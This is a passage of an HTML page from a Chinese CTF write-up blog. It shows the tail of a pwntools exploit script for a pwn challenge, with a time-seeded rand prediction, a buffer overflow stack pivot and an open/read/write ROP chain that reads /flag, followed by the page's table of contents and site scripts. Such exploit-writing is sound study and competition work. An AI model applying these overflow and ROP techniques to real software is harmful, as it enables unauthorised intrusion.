class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rl(&quot;lets move and pwn!&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(<span class="number">0x0004013EE</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">orw  = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">orw += p64(rdi) + p64(bss)  <span class="comment">#/flag的字符串位置，要改</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(len(orw)))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(orw)) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">p.send(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/linux/" rel="tag">linux</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1729473612018"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#capoo-%E4%B8%80%E8%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">capoo 一血</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-picker"><span class="toc-number">1.2.</span> <span class="toc-text">ez_picker</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xor"><span class="toc-number">2.1.</span> <span class="toc-text">xor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezflag"><span class="toc-number">3.1.</span> <span class="toc-text">ezflag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">4.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#signin-revenge"><span class="toc-number">4.1.</span> <span class="toc-text">signin revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%A2%E9%A2%98%E7%9B%AElibc%E7%8E%AF%E5%A2%83"><span class="toc-number">4.1.1.</span> <span class="toc-text">换题目libc环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORW"><span class="toc-number">4.1.2.</span> <span class="toc-text">ORW</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signin"><span class="toc-number">4.2.</span> <span class="toc-text">signin</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":350,"height":350},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
